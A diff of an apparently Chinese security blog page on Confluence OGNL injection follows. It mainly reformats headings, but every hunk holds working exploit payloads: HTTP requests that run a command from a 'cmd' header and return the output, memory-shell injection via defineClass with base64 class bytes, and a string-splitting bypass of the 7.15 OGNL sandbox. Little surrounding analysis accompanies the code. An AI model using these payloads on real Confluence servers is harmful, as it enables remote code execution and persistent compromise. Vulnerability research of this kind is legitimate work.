@@ -477,7 +477,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Confluence-CVE-2022-26134"><a href="#Confluence-CVE-2022-26134" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h1><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
+                <h2 id="Confluence-CVE-2022-26134"><a href="#Confluence-CVE-2022-26134" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h2><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
 <p>21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用<code>ognl.getValue()</code>处理。confluence处理vm文件，首先将vm内容转为AST语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。而我们构造的payload中的queryString就是其中一个节点。</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
 Host: ty.com:8090
@@ -521,8 +521,8 @@ Content-Length: 1960
 
 queryString&#x3D;\u0027%2bClass.forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022try &#123;load(\u0027nashorn:mozilla_compat.js\u0027); &#125; catch (e) &#123;&#125; importPackage(Packages.java.util);importPackage(Packages.java.lang); importPackage(Packages.java.io); function Base64DecodeToByte(str) &#123;importPackage(Packages.sun.misc);importPackage(Packages.java.util);var bt;try &#123; bt &#x3D; new BASE64Decoder().decodeBuffer(str);&#125; catch (e) &#123;bt &#x3D; new Base64().getDecoder().decode(str);&#125;return bt;&#125; function define(Classdata) &#123;var classBytes &#x3D; Base64DecodeToByte(Classdata);var byteArray &#x3D; Java.type(\u0027byte[]\u0027);var int &#x3D; Java.type(\u0027int\u0027);var defineClassMethod &#x3D; java.lang.ClassLoader.class.getDeclaredMethod(\u0027defineClass\u0027,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc &#x3D; defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),classBytes,0,classBytes.length);return cc.getConstructor().newInstance(); &#125; define(\u0027yv66vgAA..\u0027);\u0022)%2b\u0027</code></pre>
 
-<h1 id="Confluence-CVE-2022-26134-1"><a href="#Confluence-CVE-2022-26134-1" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h1><p>这个洞可以分成两部分去看，一个是7.15版本以前的原始版，另一个是7.15版本以后的沙箱版。但无论哪个版本，漏洞的成因都是相同的。</p>
-<h2 id="原始版"><a href="#原始版" class="headerlink" title="原始版"></a>原始版</h2><h3 id="回显POC-1"><a href="#回显POC-1" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST 	&#x2F;%24%7BClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+<h2 id="Confluence-CVE-2022-26134-1"><a href="#Confluence-CVE-2022-26134-1" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h2><p>这个洞可以分成两部分去看，一个是7.15版本以前的原始版，另一个是7.15版本以后的沙箱版。但无论哪个版本，漏洞的成因都是相同的。</p>
+<h3 id="回显POC-1"><a href="#回显POC-1" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST 	&#x2F;%24%7BClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
 Host: localhost:8091
 cmd: whoami
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
@@ -554,8 +554,7 @@ Content-Length: 8973
 code&#x3D;yv66vgAA</code></pre>
 
 <pre class="language-none"><code class="language-none">&#x2F;$&#123;@org.springframework.cglib.core.ReflectUtils@defineClass(&#39;Memshell&#39;,@org.springframework.util.Base64Utils@decodeFromString(@com.opensymphony.xwork.ActionContext@getContext().getParameters().get(&#39;code&#39;)),new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))&#125;&#x2F;</code></pre>
-
-<h2 id="沙箱版"><a href="#沙箱版" class="headerlink" title="沙箱版"></a>沙箱版</h2><p>从7.15版本开始，Confluence在OGNL表达式解析时加入了沙箱设置。沙箱存在于xwork的jar包中。我们diff一下两个版本的jar包进行观察。</p>
+<h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p>从7.15版本开始，Confluence在OGNL表达式解析时加入了沙箱设置。沙箱存在于xwork的jar包中。我们diff一下两个版本的jar包进行观察。</p>
 <p><img src="/Downloads/20221016165046.png"></p>
 <p>可以明显观察到这里多了一个SafeExpressionUtil.class。再对比一下<code>findValue</code>方法的执行点</p>
 <p><img src="/Downloads/20221016165435.png"></p>
@@ -702,7 +701,7 @@ java.io.Serializable</code></pre>
 <p><img src="/Downloads/20221016174924.png"></p>
 <p>直接用contains方法去匹配传入的表达式节点。这里可以用<code>+</code>进行一个绕过，因为这样可以在不影响执行结果的情况下改变传入的表达式节点。</p>
 <p><img src="/Downloads/20221016175435.png"></p>
-<h3 id="回显POC-2"><a href="#回显POC-2" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+<h3 id="回显POC-沙箱"><a href="#回显POC-沙箱" class="headerlink" title="回显POC(沙箱)"></a>回显POC(沙箱)</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
 Host: localhost:8091
 cmd: whoami
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
@@ -717,7 +716,7 @@ Content-Length: 0</code></pre>
 
 <pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;jav&quot;+&quot;ax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;,org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;));&quot;)&#125;&#x2F;</code></pre>
 
-<h3 id="内存马-2"><a href="#内存马-2" class="headerlink" title="内存马"></a>内存马</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22org.springframework.cglib.core.ReflectUtils.defineClass(&#39;Memshell&#39;%2Corg.springframework.util.Base64Utils.decodeFromString(com.opensymphony.xwork.ActionContext.getContext().getParameters().get(&#39;code&#39;)%5B0%5D)%2Cjava.lang.Thread.currentThread().getContextClassLoader())%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+<h3 id="内存马（沙箱）"><a href="#内存马（沙箱）" class="headerlink" title="内存马（沙箱）"></a>内存马（沙箱）</h3><pre class="language-none"><code class="language-none">POST &#x2F;%24%7BClass.forName(%22jav%22%2B%22ax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22org.springframework.cglib.core.ReflectUtils.defineClass(&#39;Memshell&#39;%2Corg.springframework.util.Base64Utils.decodeFromString(com.opensymphony.xwork.ActionContext.getContext().getParameters().get(&#39;code&#39;)%5B0%5D)%2Cjava.lang.Thread.currentThread().getContextClassLoader())%3B%22)%7D&#x2F; HTTP&#x2F;1.1
 Host: localhost:8091
 cmd: whoami
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
